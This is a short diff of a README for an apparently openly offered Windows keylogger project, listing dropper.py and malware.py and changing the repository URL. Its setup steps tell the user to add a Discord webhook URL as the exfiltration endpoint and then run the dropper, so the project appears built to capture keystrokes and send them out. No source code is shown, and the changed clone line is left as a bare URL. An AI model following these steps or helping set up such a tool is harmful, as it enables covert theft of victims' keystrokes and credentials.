@@ -38,7 +38,7 @@ Keylogger-Malware-Project/ │ ├── dropper.py ├── malware.py ├─�
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/YOUR_GITHUB_USERNAME/Keylogger-Malware-Project.git
+   https://github.com/wmdgimhana/Two-stage-keylogger-for-windows.git
 Add your Discord Webhook URL: 
 DISCORD_WEBHOOK=https://discord.com/api/webhooks/your-webhook-url
 Run the dropper:
